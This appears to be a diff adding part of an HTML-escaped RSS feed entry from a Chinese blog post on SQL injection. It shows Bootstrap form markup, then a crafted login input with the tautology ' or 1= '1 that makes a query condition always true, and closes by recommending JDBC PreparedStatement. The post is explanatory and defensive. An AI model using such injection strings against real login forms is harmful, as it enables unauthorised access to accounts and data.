+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">p&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;help-block&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>Example block-level help text here.&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">p&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">div&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">div&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;checkbox&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">label&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">input&lt;/span> &lt;span class="na">type&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;checkbox&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span> Check me out
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">label&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">div&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">button&lt;/span> &lt;span class="na">type&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;submit&amp;#34;&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;btn btn-default&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>Submit&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">button&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">form&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">div&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://cdn.kayleh.top/gh/kayleh/cdn/img/SQL%e6%b3%a8%e5%85%a5%e5%bc%8f%e6%94%bb%e5%87%bb/1.png"
+loading="lazy"
+alt="img"
+>&lt;/p>
+&lt;p>如果是客户端精心构造的字符串，例如&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="n">name&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s2">&amp;#34;kayleh&amp;#39; OR pass=&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">pass&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s2">&amp;#34; OR pass=&amp;#39;&amp;#34;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="s1">&amp;#39; or 1= &amp;#39;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>命令行永远为真，导致注入成功。&lt;/p>
+&lt;blockquote>
+&lt;p>所以使用JDBC时，尽量使用速度比较快且安全的 PreparedStatement ，PreparedStatement 使用的是预编译机制。&lt;/p>
+&lt;/blockquote></description></item></channel></rss>
